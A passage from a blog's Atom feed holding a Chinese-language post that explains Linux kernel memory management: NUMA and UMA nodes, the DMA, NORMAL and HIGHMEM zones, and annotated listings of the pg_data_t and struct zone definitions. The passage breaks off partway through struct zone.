    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="wp" scheme="https://zjw1nd.github.io/tags/wp/"/>
    
    <category term="chop" scheme="https://zjw1nd.github.io/tags/chop/"/>
    
  </entry>
  
  <entry>
    <title>页表之上——Linux内核的内存管理</title>
    <link href="https://zjw1nd.github.io/2024/10/30/%E9%A1%B5%E8%A1%A8%E4%B9%8B%E4%B8%8A%E2%80%94%E2%80%94Linux%E5%86%85%E6%A0%B8%E7%9A%84%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    <id>https://zjw1nd.github.io/2024/10/30/%E9%A1%B5%E8%A1%A8%E4%B9%8B%E4%B8%8A%E2%80%94%E2%80%94Linux%E5%86%85%E6%A0%B8%E7%9A%84%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</id>
    <published>2024-10-30T11:08:20.000Z</published>
    <updated>2024-11-18T06:43:09.933Z</updated>
    
    <content type="html"><![CDATA[<p>我们都知道，进程内部寻址用的是虚拟地址，虚拟地址要经过mmu被映射到物理地址，进程的页表是独立的等等。但是那么多页表，内核又是怎么调度页表的呢？在我们向内核申请下一个4kb的时候究竟发生了什么？</p><blockquote><p>参考自：<a href="https://arttnba3.cn/2021/02/21/OS-0X00-LINUX-KERNEL-PART-I">https://arttnba3.cn/2021/02/21/OS-0X00-LINUX-KERNEL-PART-I</a><br>以及一篇更加入门的介绍：<a href="https://cloud.tencent.com/developer/article/1775509">https://cloud.tencent.com/developer/article/1775509</a><br><a href="https://segmentfault.com/a/1190000043626203">https://segmentfault.com/a/1190000043626203</a></p></blockquote><h1>内核视角下的“主存”</h1><p>在内核的视图下，内存自顶向下有3级的管理，依次是节点（node），区（zone）和页（page）或者页框（page frame）。我们从最高（最大）的等级依次向下看。</p><h2 id="什么是节点？">什么是节点？</h2><blockquote><p><a href="https://blog.csdn.net/gatieme/article/details/52384075">https://blog.csdn.net/gatieme/article/details/52384075</a><br>写的很细很好，不再摘抄了，了解节点可以直接点进去看按我看这两篇blog的理解，节点大概就是<strong>物理内存条</strong>， 虽然肯定不是这个意思，但是在抽象的层级上来说，地位大概是物理内存条这一级。这个东西涉及到硬件处理器的设计。一般来讲，对于现代多核CPU访问内存有两种架构，UMA（均匀存储器存取，Uniform-Memory-Access）和NUMA（非均匀存储器存取）。</p></blockquote><p>先说UMA,这种思想就是对于多个CPU, 他们对所有主存都有同样的访问级别，从总线存取的时间等等都基本一样，外围设备也能够共享。大火都一样。</p><p>节点的概念则来自于NUMA架构。简单来讲，虽然每个CPU都能访问全部的物理内存，但是它们访问“自己的”本地存储会更快。我们把这样的本地存储叫做“簇（bank）”，把这些不同的cpu叫做“节点（node）”。而在操作系统内存分配的时候，我们说的节点也就指这些内存簇了。</p><p>LINUX需要的是一种体系无关的内存分配结构，所以它采用了NUMA的节点概念。对于UMA,我们就认为只有一个节点，将他转化成一种伪NUMA的体系进行处理就好了。所以以UMA架构为例的话，节点就是全部的物理存储单元。</p><p>linux使用<code>pg_data_t</code>来描述一个节点。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The pg_data_t structure is used in machines with CONFIG_DISCONTIGMEM</span></span><br><span class="line"><span class="comment"> * (mostly NUMA machines?) to denote a higher-level memory zone than the</span></span><br><span class="line"><span class="comment"> * zone denotes.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * On NUMA machines, each NUMA node would have a pg_data_t to describe</span></span><br><span class="line"><span class="comment"> * it&#x27;s memory layout.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Memory statistics and page replacement data structures are maintained on a</span></span><br><span class="line"><span class="comment"> * per-zone basis.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bootmem_data</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">pglist_data</span> &#123;</span></span><br><span class="line">    <span class="comment">/*  包含了结点中各内存域的数据结构 , 可能的区域类型用zone_type表示*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">zone</span> <span class="title">node_zones</span>[<span class="title">MAX_NR_ZONES</span>];</span></span><br><span class="line">    <span class="comment">/*  指点了备用结点及其内存域的列表，以便在当前结点没有可用空间时，在备用结点分配内存   */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">zonelist</span> <span class="title">node_zonelists</span>[<span class="title">MAX_ZONELISTS</span>];</span></span><br><span class="line">    <span class="type">int</span> nr_zones;                                   <span class="comment">/*  保存结点中不同内存域的数目    */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_FLAT_NODE_MEM_MAP <span class="comment">/* means !SPARSEMEM */</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">node_mem_map</span>;</span>      <span class="comment">/*  指向page实例数组的指针，用于描述结点的所有物理内存页，它包含了结点中所有内存域的页。    */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_PAGE_EXTENSION</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page_ext</span> *<span class="title">node_page_ext</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CONFIG_NO_BOOTMEM</span></span><br><span class="line">       <span class="comment">/*  在系统启动boot期间，内存管理子系统初始化之前，</span></span><br><span class="line"><span class="comment">       内核页需要使用内存（另外，还需要保留部分内存用于初始化内存管理子系统）</span></span><br><span class="line"><span class="comment">       为解决这个问题，内核使用了自举内存分配器 </span></span><br><span class="line"><span class="comment">       此结构用于这个阶段的内存管理  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bootmem_data</span> *<span class="title">bdata</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMORY_HOTPLUG</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Must be held any time you expect node_start_pfn, node_present_pages</span></span><br><span class="line"><span class="comment">     * or node_spanned_pages stay constant.  Holding this will also</span></span><br><span class="line"><span class="comment">     * guarantee that any pfn_valid() stays that way.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * pgdat_resize_lock() and pgdat_resize_unlock() are provided to</span></span><br><span class="line"><span class="comment">     * manipulate node_size_lock without checking for CONFIG_MEMORY_HOTPLUG.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Nests above zone-&gt;lock and zone-&gt;span_seqlock</span></span><br><span class="line"><span class="comment">     * 当系统支持内存热插拨时，用于保护本结构中的与节点大小相关的字段。</span></span><br><span class="line"><span class="comment">     * 哪调用node_start_pfn，node_present_pages，node_spanned_pages相关的代码时，需要使用该锁。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">spinlock_t</span> node_size_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">/* /*起始页面帧号，指出该节点在全局mem_map中的偏移</span></span><br><span class="line"><span class="comment">    系统中所有的页帧是依次编号的，每个页帧的号码都是全局唯一的（不只是结点内唯一）  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> node_start_pfn;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> node_present_pages; <span class="comment">/* total number of physical pages 结点中页帧的数目 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> node_spanned_pages; <span class="comment">/* total size of physical page range, including holes                     该结点以页帧为单位计算的长度，包含内存空洞 */</span></span><br><span class="line">    <span class="type">int</span> node_id;        <span class="comment">/*  全局结点ID，系统中的NUMA结点都从0开始编号  */</span></span><br><span class="line">    <span class="type">wait_queue_head_t</span> kswapd_wait;      <span class="comment">/*  交换守护进程的等待队列，</span></span><br><span class="line"><span class="comment">    在将页帧换出结点时会用到。后面的文章会详细讨论。    */</span></span><br><span class="line">    <span class="type">wait_queue_head_t</span> pfmemalloc_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">kswapd</span>;</span>     <span class="comment">/* Protected by  mem_hotplug_begin/end() 指向负责该结点的交换守护进程的task_struct。   */</span></span><br><span class="line">    <span class="type">int</span> kswapd_max_order;                       <span class="comment">/*  定义需要释放的区域的长度  */</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">zone_type</span> <span class="title">classzone_idx</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPACTION</span></span><br><span class="line">    <span class="type">int</span> kcompactd_max_order;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">zone_type</span> <span class="title">kcompactd_classzone_idx</span>;</span></span><br><span class="line">    <span class="type">wait_queue_head_t</span> kcompactd_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">kcompactd</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NUMA_BALANCING</span></span><br><span class="line">    <span class="comment">/* Lock serializing the migrate rate limiting window */</span></span><br><span class="line">    <span class="type">spinlock_t</span> numabalancing_migrate_lock;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Rate limiting time interval */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> numabalancing_migrate_next_window;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Number of pages migrated during the rate limiting time interval */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> numabalancing_migrate_nr_pages;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEFERRED_STRUCT_PAGE_INIT</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * If memory initialisation on large machines is deferred then this</span></span><br><span class="line"><span class="comment">     * is the first PFN that needs to be initialised.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> first_deferred_pfn;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_DEFERRED_STRUCT_PAGE_INIT */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_TRANSPARENT_HUGEPAGE</span></span><br><span class="line">    <span class="type">spinlock_t</span> split_queue_lock;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">split_queue</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> split_queue_len;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125; <span class="type">pg_data_t</span>;</span><br></pre></td></tr></table></figure><h2 id="什么是区？">什么是区？</h2><blockquote><p>参考自<a href="https://www.cnblogs.com/linhaostudy/p/10006723.html#_label0">https://www.cnblogs.com/linhaostudy/p/10006723.html#_label0</a><br>上面说道我们每个cpu都有一个节点内存。对于每个节点，又被划分为不同的区。一个管理区域通过struct zone_struct描述, 其被定义为zone_t, 用以表示内存的某个范围, 低端范围的16MB被描述为ZONE_DMA, 某些工业标准体系结构中的(ISA)设备需要用到它, 然后是可直接映射到内核的普通内存域ZONE_NORMAL,最后是超出了内核段的物理地址域ZONE_HIGHMEM, 被称为高端内存（64位已经不用了）.　是系统中预留的可用内存空间, 不能被内核直接映射.</p></blockquote><p>这么大费周章又是要干嘛？其实这三个区都有说法。最低16mb是为了兼容isa总线dma处理器用的（虽然我不知道这是什么），中间能直接线性映射的就直接映射，而对于现代32位x86架构只能寻址4g,很多内存没法直接映射，就又要单独讨论，这么着划分的3个区。</p><p>其实还有其他标记节点内存区的标记：比如ZONE_MOVEABLE, ZONE_DEVICE等这种伪内存区，为了热插拔等等特性所设计，这里不再展开。而现在的AMD64架构已经不再需要高端内存了，128T足够将所有物理内存线性映射到内核</p><blockquote><p>这也成为后面我们要谈的ret2dir攻击手法的开始</p></blockquote><p>最后简单谈谈32位下内核空间1g用户空间3g,超出normal区的高端内存如何访问。按这篇blog来讲，就是临时替换页表，从虚拟地址选一段出来做逻辑地址空间然后临时借用，换掉页表建立映射，用完归还。另外，intel似乎支持一种叫做PAE页表扩展的技术，可以通过扩展一级页表让系统访问更多的内存，这里也不再展开。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/* Read-mostly fields */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* zone watermarks, access with *_wmark_pages(zone) macros */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> watermark[NR_WMARK];</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> nr_reserved_highatomic;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * We don&#x27;t know if the memory that we&#x27;re going to allocate will be</span></span><br><span class="line"><span class="comment">     * freeable or/and it will be released eventually, so to avoid totally</span></span><br><span class="line"><span class="comment">     * wasting several GB of ram we must reserve some of the lower zone</span></span><br><span class="line"><span class="comment">     * memory (otherwise we risk to run OOM on the lower zones despite</span></span><br><span class="line"><span class="comment">     * there being tons of freeable ram on the higher zones).  This array is</span></span><br><span class="line"><span class="comment">     * recalculated at runtime if the sysctl_lowmem_reserve_ratio sysctl</span></span><br><span class="line"><span class="comment">     * changes.</span></span><br><span class="line"><span class="comment">     * 分别为各种内存域指定了若干页</span></span><br><span class="line"><span class="comment">     * 用于一些无论如何都不能失败的关键性内存分配。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">long</span> lowmem_reserve[MAX_NR_ZONES];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">    <span class="type">int</span> node;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * The target ratio of ACTIVE_ANON to INACTIVE_ANON pages on</span></span><br><span class="line"><span class="comment">     * this zone&#x27;s LRU.  Maintained by the pageout code.</span></span><br><span class="line"><span class="comment">     * 不活动页的比例,</span></span><br><span class="line"><span class="comment">     * 接着是一些很少使用或者大部分情况下是只读的字段：</span></span><br><span class="line"><span class="comment">     * wait_table wait_table_hash_nr_entries wait_table_bits</span></span><br><span class="line"><span class="comment">     * 形成等待列队，可以等待某一页可供进程使用  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> inactive_ratio;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*  指向这个zone所在的pglist_data对象  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pglist_data</span>      *<span class="title">zone_pgdat</span>;</span></span><br><span class="line">    <span class="comment">/*/这个数组用于实现每个CPU的热/冷页帧列表。内核使用这些列表来保存可用于满足实现的“新鲜”页。但冷热页帧对应的高速缓存状态不同：有些页帧很可能在高速缓存中，因此可以快速访问，故称之为热的；未缓存的页帧与此相对，称之为冷的。*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_pageset</span> __<span class="title">percpu</span> *<span class="title">pageset</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This is a per-zone reserve of pages that are not available</span></span><br><span class="line"><span class="comment">     * to userspace allocations.</span></span><br><span class="line"><span class="comment">     * 每个区域保留的不能被用户空间分配的页面数目</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       totalreserve_pages;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CONFIG_SPARSEMEM</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Flags for a pageblock_nr_pages block. See pageblock-flags.h.</span></span><br><span class="line"><span class="comment">     * In SPARSEMEM, this map is stored in struct mem_section</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       *pageblock_flags;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_SPARSEMEM */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * zone reclaim becomes active if more unmapped pages exist.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       min_unmapped_pages;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       min_slab_pages;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_NUMA */</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* zone_start_pfn == zone_start_paddr &gt;&gt; PAGE_SHIFT</span></span><br><span class="line"><span class="comment">     * 只内存域的第一个页帧 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       zone_start_pfn;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * spanned_pages is the total pages spanned by the zone, including</span></span><br><span class="line"><span class="comment">     * holes, which is calculated as:</span></span><br><span class="line"><span class="comment">     *      spanned_pages = zone_end_pfn - zone_start_pfn;</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * present_pages is physical pages existing within the zone, which</span></span><br><span class="line"><span class="comment">     * is calculated as:</span></span><br><span class="line"><span class="comment">     *      present_pages = spanned_pages - absent_pages(pages in holes);</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * managed_pages is present pages managed by the buddy system, which</span></span><br><span class="line"><span class="comment">     * is calculated as (reserved_pages includes pages allocated by the</span></span><br><span class="line"><span class="comment">     * bootmem allocator):</span></span><br><span class="line"><span class="comment">     *      managed_pages = present_pages - reserved_pages;</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * So present_pages may be used by memory hotplug or memory power</span></span><br><span class="line"><span class="comment">     * management logic to figure out unmanaged pages by checking</span></span><br><span class="line"><span class="comment">     * (present_pages - managed_pages). And managed_pages should be used</span></span><br><span class="line"><span class="comment">     * by page allocator and vm scanner to calculate all kinds of watermarks</span></span><br><span class="line"><span class="comment">     * and thresholds.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Locking rules:</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * zone_start_pfn and spanned_pages are protected by span_seqlock.</span></span><br><span class="line"><span class="comment">     * It is a seqlock because it has to be read outside of zone-&gt;lock,</span></span><br><span class="line"><span class="comment">     * and it is done in the main allocator path.  But, it is written</span></span><br><span class="line"><span class="comment">     * quite infrequently.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * The span_seq lock is declared along with zone-&gt;lock because it is</span></span><br><span class="line"><span class="comment">     * frequently read in proximity to zone-&gt;lock.  It&#x27;s good to</span></span><br><span class="line"><span class="comment">     * give them a chance of being in the same cacheline.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Write access to present_pages at runtime should be protected by</span></span><br><span class="line"><span class="comment">     * mem_hotplug_begin/end(). Any reader who can&#x27;t tolerant drift of</span></span><br><span class="line"><span class="comment">     * present_pages should get_online_mems() to get a stable value.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Read access to managed_pages should be safe because it&#x27;s unsigned</span></span><br><span class="line"><span class="comment">     * long. Write access to zone-&gt;managed_pages and totalram_pages are</span></span><br><span class="line"><span class="comment">     * protected by managed_page_count_lock at runtime. Idealy only</span></span><br><span class="line"><span class="comment">     * adjust_managed_page_count() should be used instead of directly</span></span><br><span class="line"><span class="comment">     * touching zone-&gt;managed_pages and totalram_pages.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       managed_pages;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       spanned_pages;             <span class="comment">/*  总页数，包含空洞  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       present_pages;              <span class="comment">/*  可用页数，不包哈空洞  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*  指向管理区的传统名字, &quot;DMA&quot;, &quot;NROMAL&quot;或&quot;HIGHMEM&quot; */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>          *name;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMORY_ISOLATION</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Number of isolated pageblock. It is used to solve incorrect</span></span><br><span class="line"><span class="comment">     * freepage counting problem due to racy retrieving migratetype</span></span><br><span class="line"><span class="comment">     * of pageblock. Protected by zone-&gt;lock.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       nr_isolate_pageblock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMORY_HOTPLUG</span></span><br><span class="line">    <span class="comment">/* see spanned/present_pages for more description */</span></span><br><span class="line">    <span class="type">seqlock_t</span>           span_seqlock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * wait_table       -- the array holding the hash table</span></span><br><span class="line"><span class="comment">     * wait_table_hash_nr_entries   -- the size of the hash table array</span></span><br><span class="line"><span class="comment">     * wait_table_bits      -- wait_table_size == (1 &lt;&lt; wait_table_bits)</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * The purpose of all these is to keep track of the people</span></span><br><span class="line"><span class="comment">     * waiting for a page to become available and make them</span></span><br><span class="line"><span class="comment">     * runnable again when possible. The trouble is that this</span></span><br><span class="line"><span class="comment">     * consumes a lot of space, especially when so few things</span></span><br><span class="line"><span class="comment">    